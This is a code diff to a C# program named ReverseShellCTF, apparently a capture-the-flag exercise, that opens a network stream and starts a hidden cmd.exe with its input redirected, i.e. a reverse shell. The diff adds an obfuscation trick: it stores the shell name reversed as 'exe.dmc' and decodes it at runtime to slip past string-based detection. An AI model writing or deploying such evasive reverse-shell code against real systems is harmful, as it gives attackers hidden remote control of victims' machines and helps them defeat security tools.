@@ -3,12 +3,18 @@ using System.Net.Sockets;
 using System.Text;
 using System.IO;
 using System.Diagnostics;
+using System.Linq;
 
 namespace ReverseShellCTF
 {
     class Program
     {
         static StreamWriter writer;
+
+        public static string ReverseString(string s)
+        {
+            return new string(s.Reverse().ToArray());
+        }
 
         static void Main(string[] args)
         {
@@ -27,8 +33,11 @@ namespace ReverseShellCTF
                 {
                     writer = new StreamWriter(stream) { AutoFlush = true };
 
+                    string reversedCmd = "exe.dmc"; 
+                    string shellName = ReverseString(reversedCmd);
+
                     Process process = new Process();
-                    process.StartInfo.FileName = "cmd.exe";
+                    process.StartInfo.FileName = shellName;
                     process.StartInfo.CreateNoWindow = true;
                     process.StartInfo.UseShellExecute = false;
                     process.StartInfo.RedirectStandardInput = true;
